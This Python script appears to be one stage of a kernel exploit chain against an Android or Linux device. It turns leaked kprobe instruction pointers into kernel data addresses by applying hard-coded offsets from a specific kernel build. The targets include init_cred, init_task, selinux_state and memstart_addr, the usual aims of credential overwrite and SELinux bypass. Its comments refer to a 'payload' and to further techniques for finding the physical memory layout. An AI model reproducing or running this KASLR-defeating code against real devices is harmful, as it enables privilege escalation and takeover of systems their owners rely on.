#!/usr/bin/env python3
"""Derive device data addresses from perf/kprobe sample IPs + r59 deltas.

Input: the output of tools/perf_kprobe.sh, lines of the form
    PROBE_IP sym=... ip=0x...
The r59 certified Image gives the relative offset from each probed function to
the static data object it references.  If the device's private respin keeps that
relative layout (the usual case for a small ASB delta; the payload's read-only
gates verify it), the device data address is:

    device_data = PROBE_IP(function) + (r59_data - r59_function)

No boot image and no /proc/kallsyms access are required.

The 0x... values below are from the certified r59 Image (sha256 fe3ef364...).
"""
import re
import sys

# function -> list of (data symbol, r59 delta from the function address)
FUNCTION_DATA = {
    "__traceiter_sys_exit": [("__tracepoint_sys_exit", 0x264D710)],
    "prepare_kernel_cred": [("init_cred", 0x20CC8D8)],
    "avc_has_perm": [("selinux_state", 0x26936BC)],
    "pipe_write": [("anon_pipe_buf_ops", 0x10E41B0)],
    "misc_open": [("misc_list", 0x236E02C)],
    "uhid_char_write": [("uhid_fops", 0x5C92F8),
                         ("uhid_misc", 0x1803440)],
    "virt_to_phys": [("memstart_addr", 0x15524AC),
                     ("kimage_voffset", 0x1553434)],
}

# init_cred -> other data symbols (r59 certified Image)
INIT_CRED_REL = {
    "init_cred": 0x0,
    "init_task": -0x15D80,
    "init_signals": -0x14940,
    "_sdata": -0x33840,
    "_end": +0x2CC7C0,
    "LINK_CYCLE_C (init_task.thread_node)": -0x155C8,
    "LINK_CYCLE_D (init_signals.thread_head)": -0x14930,
}


def parse(path):
    hits = {}
    for line in open(path, encoding="utf-8", errors="ignore"):
        m = re.search(r"PROBE_IP sym=(\S+) ip=0x([0-9a-fA-F]+)", line)
        if m:
            hits.setdefault(m.group(1), []).append(int(m.group(2), 16))
    return hits


def main():
    if len(sys.argv) != 2:
        sys.exit("usage: perf_derive.py <perf-kprobe log>")
    hits = parse(sys.argv[1])
    if not hits:
        sys.exit("no PROBE_IP lines found")
    derived = {}
    for fn, addrs in hits.items():
        ip = addrs[0]
        print(f"FUNCTION {fn} ip=0x{ip:016x} hits={len(addrs)}")
        for data, delta in FUNCTION_DATA.get(fn, []):
            value = (ip + delta) & ((1 << 64) - 1)
            derived[data] = value
            print(f"  DATA {data} = 0x{value:016x} (delta {delta:+#x})")
    if "init_cred" in derived:
        base = derived["init_cred"]
        print("INIT_CRED_CLUSTER")
        for name, delta in INIT_CRED_REL.items():
            value = (base + delta) & ((1 << 64) - 1)
            print(f"  {name} = 0x{value:016x} (delta {delta:+#x})")
    else:
        print("INIT_CRED_MISSING (need prepare_kernel_cred hit)")
    print("NOTE: direct-map values still need PHYS_DELTA = imagePhys - memstart;")
    print("      use the mm_page_alloc tracepoint+kernelsnitch path or the")
    print("      payload's runtime load_physical_layout to close that last bit.")


if __name__ == "__main__":
    main()
